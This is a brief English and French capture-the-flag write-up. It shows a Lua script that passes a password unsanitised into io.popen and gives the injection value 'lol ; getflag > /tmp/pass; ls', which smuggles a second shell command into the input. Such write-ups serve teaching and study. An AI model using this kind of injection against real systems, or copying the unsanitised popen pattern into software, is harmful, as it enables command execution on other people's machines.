### English
We can see in the lua script that an echo is executed: 
```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

We can then hijack this echo so that it sends the getflag command:
- lol ; getflag > /tmp/pass; ls

### Francais
Nous pouvons voir dans le script lua qu'un echo est executé: 
```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Nous pouvons alors detourné ce echo pour qu'il envoi la commande getflag: 
- lol ; getflag > /tmp/pass; ls